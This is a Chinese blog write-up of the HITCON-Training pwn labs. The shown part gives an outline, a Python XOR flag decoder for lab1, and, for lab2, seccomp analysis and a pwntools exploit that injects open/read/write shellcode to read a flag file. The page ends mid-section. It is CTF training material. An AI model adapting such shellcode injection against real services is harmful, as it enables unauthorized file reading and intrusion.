@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
+  </script>
+
+  <meta name="description" content="因为项目和刷leetcode，好久没实操pwn题了，最近回看一下基础的pwn题，回顾基本操作与工具使用并做个记录方便日后查阅。这里选取的是下面这个项目。 项目地址：scwuaptx&#x2F;HITCON-Training">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON-Training回顾pwn题工具使用与基本套路">
+<meta property="og:url" content="http://yoursite.com/2020/07/15/hitcon-training-writeup/index.html">
+<meta property="og:site_name" content="sec4fun">
+<meta property="og:description" content="因为项目和刷leetcode，好久没实操pwn题了，最近回看一下基础的pwn题，回顾基本操作与工具使用并做个记录方便日后查阅。这里选取的是下面这个项目。 项目地址：scwuaptx&#x2F;HITCON-Training">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/images/hitcon_training/stack_pivot.png">
+<meta property="article:published_time" content="2020-07-15T13:58:21.000Z">
+<meta property="article:modified_time" content="2020-07-23T12:50:32.000Z">
+<meta property="article:author" content="ma5ker">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/images/hitcon_training/stack_pivot.png">
+
+
+<link rel="canonical" href="http://yoursite.com/2020/07/15/hitcon-training-writeup/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HITCON-Training回顾pwn题工具使用与基本套路 | sec4fun</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">sec4fun</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Outline"><span class="nav-number">1.</span> <span class="nav-text">Outline</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Details"><span class="nav-number">2.</span> <span class="nav-text">Details</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#lab1"><span class="nav-number">2.1.</span> <span class="nav-text">lab1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab2"><span class="nav-number">2.2.</span> <span class="nav-text">lab2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab3"><span class="nav-number">2.3.</span> <span class="nav-text">lab3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab4"><span class="nav-number">2.4.</span> <span class="nav-text">lab4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab5"><span class="nav-number">2.5.</span> <span class="nav-text">lab5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab6"><span class="nav-number">2.6.</span> <span class="nav-text">lab6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab7"><span class="nav-number">2.7.</span> <span class="nav-text">lab7</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%85%E8%B0%88fmtstr-payload%E4%BD%BF%E7%94%A8"><span class="nav-number">2.7.1.</span> <span class="nav-text">浅谈fmtstr_payload使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab8"><span class="nav-number">2.8.</span> <span class="nav-text">lab8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab9"><span class="nav-number">2.9.</span> <span class="nav-text">lab9</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E6%A0%88%E4%B8%8Abuff%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.9.1.</span> <span class="nav-text">非栈上buff的格式化字符串漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab10"><span class="nav-number">2.10.</span> <span class="nav-text">lab10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab11"><span class="nav-number">2.11.</span> <span class="nav-text">lab11</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#lab11-1"><span class="nav-number">2.11.1.</span> <span class="nav-text">lab11 - 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lab11-2"><span class="nav-number">2.11.2.</span> <span class="nav-text">lab11 - 2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab12"><span class="nav-number">2.12.</span> <span class="nav-text">lab12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab13"><span class="nav-number">2.13.</span> <span class="nav-text">lab13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab14"><span class="nav-number">2.14.</span> <span class="nav-text">lab14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lab15"><span class="nav-number">2.15.</span> <span class="nav-text">lab15</span></a></li></ol></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ma5ker"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">ma5ker</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Ma5ker" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Ma5ker" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:kcahlb@gmail.com" title="E-Mail → mailto:kcahlb@gmail.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/15/hitcon-training-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="ma5ker">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sec4fun">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HITCON-Training回顾pwn题工具使用与基本套路
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-07-15 21:58:21" itemprop="dateCreated datePublished" datetime="2020-07-15T21:58:21+08:00">2020-07-15</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-07-23 20:50:32" itemprop="dateModified" datetime="2020-07-23T20:50:32+08:00">2020-07-23</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>36k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>32 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>因为项目和刷leetcode，好久没实操pwn题了，最近回看一下基础的pwn题，回顾基本操作与工具使用并做个记录方便日后查阅。这里选取的是下面这个项目。</p>
+<p><em>项目地址：<a target="_blank" rel="noopener" href="https://github.com/scwuaptx/HITCON-Training">scwuaptx/HITCON-Training</a></em></p>
+<a id="more"></a>
+
+<h2 id="Outline"><a href="#Outline" class="headerlink" title="Outline"></a>Outline</h2><ul>
+<li><p>Basic Knowledge</p>
+<ul>
+<li>Introduction<ul>
+<li>Reverse Engineering<ul>
+<li>Static Analysis</li>
+<li>Dynamic Analysis</li>
+<li>Exploitation</li>
+<li>Useful Tool<ul>
+<li>IDA PRO<ul>
+<li>GDB</li>
+<li>Pwntool</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#lab1">lab 1 - sysmagic</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Section</li>
+<li>Compile,linking,assmbler</li>
+<li>Execution<ul>
+<li>how program get run</li>
+<li>Segment</li>
+</ul>
+</li>
+<li>x86 assembly<ul>
+<li>Calling convention</li>
+<li><a href="#lab2">lab 2 - open/read/write</a></li>
+<li>shellcoding</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Stack Overflow</p>
+<ul>
+<li>Buffer Overflow</li>
+<li>Return to Text/Shellcode<ul>
+<li><a href="#lab3">lab 3 - ret2shellcode</a></li>
+</ul>
+</li>
+<li>Protection<ul>
+<li>ASLR/DEP/PIE/StackGuard</li>
+</ul>
+</li>
+<li>Lazy binding</li>
+<li>Return to Library<ul>
+<li><a href="##lab4">lab 4 - ret2lib</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Return Oriented Programming</p>
+<ul>
+<li>ROP<ul>
+<li><a href="#lab5">lab 5 - simple rop</a></li>
+</ul>
+</li>
+<li>Using ROP bypass ASLR<ul>
+<li>ret2plt</li>
+</ul>
+</li>
+<li>Stack migration<ul>
+<li><a href="#lab6">lab 6 - migration</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Format String Attack</p>
+<ul>
+<li>Format String</li>
+<li>Read from arbitrary memory<ul>
+<li><a href="#lab7">lab 7 - crack</a></li>
+</ul>
+</li>
+<li>Write to arbitrary memory<ul>
+<li><a href="#lab8">lab 8 - craxme</a></li>
+</ul>
+</li>
+<li>Advanced Trick<ul>
+<li>EBP chain</li>
+<li><a href="#lab9">lab 9 - playfmt</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>x64 Binary Exploitation</p>
+<ul>
+<li>x64 assembly</li>
+<li>ROP</li>
+<li>Format string Attack</li>
+</ul>
+</li>
+<li><p>Heap exploitation</p>
+<ul>
+<li>Glibc memory allocator overview</li>
+<li>Vulnerablility on heap<ul>
+<li>Use after free<ul>
+<li><a href="#lab10">lab 10 - hacknote</a></li>
+</ul>
+</li>
+<li>Heap overflow<ul>
+<li>house of force<ul>
+<li>[lab 11 - 1 - bamboobox1](#lab11 - 1)</li>
+</ul>
+</li>
+<li>unlink<ul>
+<li>[lab 11 - 2 - bamboobox2](#lab11 - 2)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Advanced heap exploitation</p>
+<ul>
+<li>Fastbin attack<ul>
+<li><a href="#lab12">lab 12 - babysecretgarden</a></li>
+</ul>
+</li>
+<li>Shrink the chunk</li>
+<li>Extend the chunk<ul>
+<li><a href="#lab13">lab 13 - heapcreator</a></li>
+</ul>
+</li>
+<li>Unsortbin attack<ul>
+<li><a href="#lab14">lab 14 - magicheap</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>C++ Exploitation</p>
+<ul>
+<li>Name Mangling</li>
+<li>Vtable fucntion table</li>
+<li>Vector &amp; String</li>
+<li>New &amp; delete</li>
+<li>Copy constructor &amp; assignment operator<ul>
+<li><a href="#lab15">lab 15 - zoo</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h2><p>这里是writeup。待更新…</p>
+<h3 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h3><p>这是一道非常简单的逆向题，给出的是一个elf32的bin，通过ida打开，main如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  get_flag();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要逻辑位于get_flag函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//set registers</span></span><br><span class="line">...</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me maigc :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( buf != v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x30</span>; ++i )</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="keyword">char</span>)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v67;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数从/dev/urandom中读入4字节到buf，然后比对是否正确，正确则使用putchar输出解密后的flag</span></span><br></pre></td></tr></table></figure>
+
+<p>由于flag并不依赖于输入，所以直接按照程序逻辑解码即可。</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cipher= [<span class="number">7</span>, <span class="number">59</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">76</span>, <span class="number">30</span>, <span class="number">66</span>]</span><br><span class="line">key= <span class="string">&quot;Do_you_know_why_my_teammate_Orange_is_so_angry???&quot;</span></span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x31</span>):</span><br><span class="line">	flag.append(chr(cipher[i] ^ ord(key[i])))</span><br><span class="line">print(<span class="string">&quot;flag: &quot;</span>+<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure>
+
+<p>得到flag: <code>CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;</code></p>
+<h3 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h3><p>题目基本信息、保护措施与运行情况如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@e76fd4f7:/ctf/work/lab2# file orw.bin</span><br><span class="line">orw.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped</span><br><span class="line">root@e76fd4f7:/ctf/work/lab2# checksec --file orw.bin</span><br><span class="line">[*] &#x27;/ctf/work/lab2/orw.bin&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">root@e76fd4f7:/ctf/work/lab2# ./orw.bin</span><br><span class="line">Give my your shellcode:0x121212121212</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+
+<p>ida查看：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑比较简单，接受用户传入的shellcode并且直接执行。这里需要注意的是在此之前调用了<code>orw_seccomp()</code>函数，经过搜索知道seccomp大概是一个类似沙箱的东西，禁用掉了一部分的系统调用，可以使用<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>来查看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@e76fd4f7:&#x2F;ctf&#x2F;work&#x2F;lab2# seccomp-tools dump .&#x2F;orw.bin</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  if (A !&#x3D; ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  if (A &#x3D;&#x3D; rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  if (A &#x3D;&#x3D; sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  if (A &#x3D;&#x3D; exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  if (A &#x3D;&#x3D; exit) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  if (A &#x3D;&#x3D; open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  if (A &#x3D;&#x3D; read) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  if (A &#x3D;&#x3D; write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
+
+<p>是一个白名单，只有跳转到0010的几个系统调用是可以使用的，其余的都被禁用掉了。我们的目标是获取flag文件，使用read读入文件，再用write写入标准输出流即可，不需要得到<code>shell</code>。</p>
+<p><strong>exp</strong></p>
+<p>这里使用pwntools的shellcode生成模块来生成shellcode。至于这里的flag路径怎么办，我觉得只有不停的猜测了，一般是就在本题的目录下的,所以可以先用相对路径尝试下…</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p=process(<span class="string">&#x27;./orw.bin&#x27;</span>)</span><br><span class="line"><span class="comment"># push  path </span></span><br><span class="line">payload=shellcraft.pushstr(<span class="string">&#x27;./flag.txt&#x27;</span>)</span><br><span class="line"><span class="comment"># open file</span></span><br><span class="line">payload+=shellcraft.open(<span class="string">&quot;esp&quot;</span>)</span><br><span class="line"><span class="comment"># read file </span></span><br><span class="line">payload+=shellcraft.read(<span class="string">&quot;eax&quot;</span>,<span class="string">&quot;esp&quot;</span>,<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># write stdout</span></span><br><span class="line">payload+=shellcraft.write(<span class="number">1</span>,<span class="string">&quot;esp&quot;</span>,<span class="number">0x100</span>)</span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(asm(payload))</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p>运行结果:</p>
